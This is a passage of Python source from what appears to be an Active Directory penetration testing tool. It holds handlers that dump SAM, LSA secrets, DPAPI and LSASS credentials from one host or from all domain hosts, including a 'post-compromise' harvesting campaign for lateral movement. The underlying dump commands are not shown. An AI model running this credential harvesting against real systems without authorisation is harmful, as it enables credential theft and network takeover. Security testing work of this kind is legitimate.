                        user, hash_value = creds.split(":", 1)
                        user = user.strip()
                        hash_value = hash_value.strip()
                        marked_user = mark_sensitive(user, "user")
                        print_info(f"User (after strip): '{marked_user}'")
                        print_info(f"Hash (after strip): '{hash_value}'")
                        shell.add_credential(domain, user, hash_value)
                except Exception as e:
                    telemetry.capture_exception(e)
                    print_error(f"Error processing line: '{line.strip()}'")
                    print_error("Error.")
                    print_exception(show_locals=False, exception=e)
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("An error occurred.")
        print_exception(show_locals=False, exception=e)


def execute_dump_rest(shell: Any, command: str, domain: str, host: str) -> None:
    """Execute generic dump command and extract credentials from output.

    **LEGACY/UNUSED**: This function appears to be legacy code and is not
    currently called from anywhere in the codebase. It's kept for backward
    compatibility and potential future use.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        command: Full command to run.
        domain: Target domain.
        host: Target host.
    """
    try:
        completed_process = shell.run_command(command, timeout=300)
        output_str = completed_process.stdout
        errors_str = completed_process.stderr

        if output_str:
            for line in output_str.splitlines():
                shell.extract_credentials(line, domain)

        if errors_str:
            print_error(f"Errors found during execution: {errors_str.strip()}")

        if completed_process.returncode != 0 and (
            not errors_str or not errors_str.strip()
        ):
            # If there was a non-zero return code AND no specific errors were already printed from stderr
            print_error(
                f"Exploit failed or process terminated with errors. Return code: {completed_process.returncode}"
            )
        elif completed_process.returncode == 0:
            print_success("Process completed successfully.")
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("An error occurred.")
        print_exception(show_locals=False, exception=e)


# ============================================================================
# CLI Command Handlers (ask_for_* and do_* functions)
# ============================================================================


def run_ask_for_dump_host(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    islocal: str,
) -> None:
    """Prompt user to dump credentials from remote host(s)."""
    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
    cred_type = "Local Admin" if islocal else "Domain Admin"
    host_display = (
        host
        if isinstance(host, str)
        else f"{len(host)} hosts"
        if isinstance(host, list)
        else "target host(s)"
    )

    if confirm_operation(
        operation_name="Remote Credential Extraction",
        description="Extracts credentials from SAM, LSA Secrets, DPAPI, and LSASS memory dumps",
        context={
            "Domain": domain,
            "PDC": pdc,
            "Target Host(s)": host_display,
            "Username": username,
            "Credential Type": cred_type,
            "Sources": "SAM, LSA, DPAPI, LSASS",
        },
        default=True,
        icon="💾",
        show_panel=True,
    ):
        run_dump_host(
            shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            islocal=islocal,
        )


def run_dump_host(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    islocal: str,
) -> None:
    """Professional credential dumping with progress tracking."""
    cred_type = "Hash" if shell.is_hash(password) else "Password"
    auth_scope = "Local" if islocal.lower() == "true" else "Domain"

    # Initialize progress tracker for credential dumping
    tracker = ScanProgressTracker(
        "Host Credential Extraction",
        total_steps=4,
    )

    # Start workflow with detailed information
    tracker.start(
        details={
            "Domain": domain,
            "Target Host": host,
            "Username": username,
            "Credential Type": cred_type,
            "Authentication Scope": auth_scope,
        }
    )

    # Step 1: SAM Database Dump
    tracker.start_step("SAM Database Dump", details="Extracting local account hashes")
    try:
        run_dump_sam(
            shell,
            domain=domain,
            username=username,
            password=password,
            host=host,
            islocal=islocal,
        )
        tracker.complete_step(details="SAM extraction completed")
    except Exception as e:
        telemetry.capture_exception(e)
        tracker.fail_step(details=f"SAM dump error: {str(e)[:50]}")

    # Step 2: LSA Secrets Dump
    tracker.start_step("LSA Secrets Dump", details="Extracting cached credentials")
    try:
        run_dump_lsa(
            shell,
            domain=domain,
            username=username,
            password=password,
            host=host,
            islocal=islocal,
        )
        tracker.complete_step(details="LSA extraction completed")
    except Exception as e:
        telemetry.capture_exception(e)
        tracker.fail_step(details=f"LSA dump error: {str(e)[:50]}")

    # Step 3: DPAPI Credentials
    tracker.start_step("DPAPI Credential Dump", details="Extracting DPAPI master keys")
    try:
        run_dump_dpapi(
            shell,
            domain=domain,
            username=username,
            password=password,
            host=host,
            islocal=islocal,
        )
        tracker.complete_step(details="DPAPI extraction completed")
    except Exception as e:
        telemetry.capture_exception(e)
        tracker.fail_step(details=f"DPAPI dump error: {str(e)[:50]}")

    # Step 4: LSASS Process Dump
    tracker.start_step(
        "LSASS Memory Dump", details="Extracting credentials from memory"
    )
    try:
        if _is_bulk_dump_target(host):
            tracker.complete_step(
                details="LSASS skipped (multi-host target not supported)"
            )
        else:
            run_ask_for_dump_lsass(
                shell,
                domain=domain,
                username=username,
                password=password,
                host=host,
                islocal=islocal,
            )
            tracker.complete_step(details="LSASS dump completed")
    except Exception as e:
        telemetry.capture_exception(e)
        tracker.fail_step(details=f"LSASS dump error: {str(e)[:50]}")

    # Print workflow summary
    tracker.print_summary()


def run_do_dump_host(shell: Any, args: str) -> None:
    """
    Dumps the credentials of a host.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        args: A string containing space-separated arguments:
            - domain (str): The domain name.
            - host (str): The target host.
            - username (str): The username for authentication.
            - password (str): The password for the specified username.
            - islocal (str): Indicates if the operation is local ('true') or remote ('false').

    The function dumps the LSA, DPAPI and asks for LSASS credentials of the target host.
    """
    args_list = args.split()
    if len(args_list) != 5:
        print_instruction(
            "Usage: dump_host <domain> <host> <username> <password> <islocal>"
        )
        return

    domain = args_list[0]
    host = args_list[1]
    username = args_list[2]
    password = args_list[3]
    islocal = args_list[4]

    run_dump_host(
        shell,
        domain=domain,
        host=host,
        username=username,
        password=password,
        islocal=islocal,
    )


def run_ask_for_dump_registries(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Prompt user to dump registry hives from Domain Controller."""
    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")

    if confirm_operation(
        operation_name="Remote Registry Dump",
        description="Extracts Windows Registry hives from the Primary Domain Controller",
        context={
            "Domain": domain,
            "PDC": pdc,
            "Username": username,
            "Target Hives": "SAM, SECURITY, SYSTEM",
            "Output Location": f"\\\\{shell.myip}\\smbFolder"
            if shell.myip
            else "SMB Share",
        },
        default=True,
        icon="📋",
    ):
        run_dump_registries(
            shell,
            domain=domain,
            username=username,
            password=password,
        )


def run_do_dump_registries(shell: Any, args: str) -> None:
    """
    Dumps the registries of a domain.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        args: A string containing space-separated arguments:
            - domain (str): The domain name.
            - username (str): The username for authentication.
            - password (str): The password for the specified username.

    The function dumps the registries of the target PDC using the specified
    username and password for authentication.
    """
    args_list = args.split()
    if len(args_list) != 3:
        print_error("Usage: dump_registries <domain> <username> <password>")
        return
    domain = args_list[0]
    username = args_list[1]
    password = args_list[2]
    run_dump_registries(
        shell,
        domain=domain,
        username=username,
        password=password,
    )


def run_ask_for_dump_all_lsa(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Prompt user to dump LSA credentials from all hosts in domain."""
    marked_domain = mark_sensitive(domain, "domain")
    if Confirm.ask(
        f"Do you want to dump the LSA credentials from all hosts in domain {marked_domain}?",
        default=False,
    ):
        run_dump_lsa(
            shell,
            domain=domain,
            username=username,
            password=password,
            host="All",
            islocal="false",
        )


def run_ask_for_dump_all_sam(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Prompt user to dump SAM credentials from all hosts in domain."""
    marked_domain = mark_sensitive(domain, "domain")
    if Confirm.ask(
        f"Do you want to dump the SAM credentials from all hosts in domain {marked_domain}?",
        default=False,
    ):
        run_dump_sam(
            shell,
            domain=domain,
            username=username,
            password=password,
            host="All",
            islocal="false",
        )


def run_ask_for_dump_all_dpapi(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Prompt user to dump DPAPI credentials from all hosts in domain."""
    marked_domain = mark_sensitive(domain, "domain")
    if Confirm.ask(
        f"Do you want to dump the DPAPI credentials from all hosts in domain {marked_domain}?",
        default=False,
    ):
        run_dump_dpapi(
            shell,
            domain=domain,
            username=username,
            password=password,
            host="All",
            islocal="false",
        )


def run_ask_for_post_da_host_dumps(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Offer a guided post-DA host dump campaign (SAM/LSA/DPAPI)."""
    marked_domain = mark_sensitive(domain, "domain")
    marked_username = mark_sensitive(username, "user")
    message = "\n".join(
        [
            "[bold]Host Credential Harvesting Campaign[/bold]",
            f"Domain: {marked_domain}",
            f"Identity: {marked_username}",
            "",
            "After Domain Admin access, this campaign helps uncover lateral movement paths that",
            "are usually missed in a first pass.",
            "",
            "[bold]Why it is high-value[/bold]",
            "- SAM dumps reveal local account hashes that may be reused across hosts.",
            "- LSA dumps reveal cached credentials and service secrets for pivoting.",
            "- DPAPI dumps reveal stored secrets that can unlock additional access.",
            "",
            "You can review and approve each dump type individually in the next prompts.",
        ]
    )
    print_panel(
        message,
        title="[bold cyan]Post-Compromise Discovery[/bold cyan]",
        border_style="cyan",
        expand=False,
    )

    if not Confirm.ask(
        "Start the host dump campaign now?",
        default=True,
    ):
        print_info("Skipping host dump campaign.")
        return

    run_ask_for_dump_all_sam(
        shell,
        domain=domain,
        username=username,
        password=password,
    )
    run_ask_for_dump_all_lsa(
        shell,
        domain=domain,
        username=username,
        password=password,
    )
    run_ask_for_dump_all_dpapi(
        shell,
        domain=domain,
        username=username,
        password=password,
    )


def run_do_dump_lsa(shell: Any, args: str) -> None:
    """
    Dumps the LSA credentials from specified hosts within a domain.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        args: A string containing space-separated arguments:
            - domain (str): The domain name.
            - username (str): The username for authentication.
            - password (str): The password for the specified username.
            - host (str): The target host or 'All' for all hosts in the domain.
            - islocal (str): Indicates if the operation is local ('true') or remote ('false').

    The function dumps the LSA credentials using NetExec.
    It supports dumping from a single host or all hosts in a specified domain.
    """
    args_list = args.split()
    if len(args_list) != 5:
        print_warning("Usage: dump_lsa <domain> <username> <password> <host> <islocal>")
        return
    domain = args_list[0]
    username = args_list[1]
    password = args_list[2]
    host = args_list[3]
    islocal = args_list[4]
    run_dump_lsa(
        shell,
        domain=domain,
        username=username,
        password=password,
        host=host,
        islocal=islocal,
    )


def run_do_dump_sam(shell: Any, args: str) -> None:
    """
    Parses the given arguments and initiates the SAM credential dumping process.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        args: A string containing space-separated arguments:
            - domain (str): The domain name.
            - username (str): The username for authentication.
            - password (str): The password for the specified username.
            - host (str): The target host or 'All' for all hosts in the domain.
            - islocal (str): Indicates if the operation is local ('true') or remote ('false').

    Usage:
        dump_sam <domain> <username> <password> <host> <islocal>
    """
    args_list = args.split()
    if len(args_list) != 5:
        print_warning("Usage: dump_sam <domain> <username> <password> <host> <islocal>")
        return
    domain = args_list[0]
    username = args_list[1]
    password = args_list[2]
    host = args_list[3]
    islocal = args_list[4]
    run_dump_sam(
        shell,
        domain=domain,
        username=username,
        password=password,
        host=host,
        islocal=islocal,
    )


def run_do_dump_dpapi(shell: Any, args: str) -> None:
    """
    Parses the given arguments and initiates the DPAPI credential dumping process.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        args: A string containing space-separated arguments:
            - domain (str): The domain name.
            - username (str): The username for authentication.
            - password (str): The password for the specified username.
            - host (str): The target host or 'All' for all hosts in the domain.
            - islocal (str): Indicates if the operation is local ('true') or remote ('false').

    Usage:
        dump_dpapi <domain> <username> <password> <host> <islocal>
    """
    args_list = args.split()
    if len(args_list) != 5:
        print_warning(
            "Usage: dump_dpapi <domain> <username> <password> <host> <islocal>"
        )
        return
    domain = args_list[0]
    username = args_list[1]
    password = args_list[2]
    host = args_list[3]
    islocal = args_list[4]
    run_dump_dpapi(
        shell,
        domain=domain,
        username=username,
        password=password,
        host=host,
        islocal=islocal,
    )


def run_ask_for_dump_lsass(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    host: str,
    islocal: str,
) -> None:
    """Prompt user to dump LSASS credentials from host."""
    marked_host = mark_sensitive(host, "hostname")
    if Confirm.ask(
        f"[+] Do you want to dump LSASS credentials from host {marked_host}?",
        default=False,
    ):
        run_dump_lsass(
            shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            islocal=islocal,
        )
